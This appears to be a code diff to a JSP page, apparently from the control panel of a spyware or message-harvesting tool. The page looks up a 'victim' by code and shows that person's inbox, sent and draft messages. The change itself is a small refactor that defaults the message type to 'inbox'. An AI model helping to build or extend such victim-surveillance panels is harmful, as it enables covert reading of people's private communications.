@@ -50,9 +50,16 @@
     <%
         try {
 
-            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 2, 2);
+            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 2);
             final String victimCode = pathInfoUtils.getPart(1);
-            final String currentMsgType = pathInfoUtils.getPart(2);
+            String currentMsgType = pathInfoUtils.getPart(2);
+
+            final String[] msgTypes = {"inbox", "sent", "draft"};
+
+            if (currentMsgType == null) {
+                currentMsgType = msgTypes[0];
+            }
+
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
@@ -92,7 +99,6 @@
                         <select id="sMessageTypes" class="form-control">
 
                             <%
-                                final String[] msgTypes = {"inbox", "sent", "draft"};
                                 for (final String msgTyp : msgTypes) {
                             %>
                             <%--TODO: Add message count :)--%>
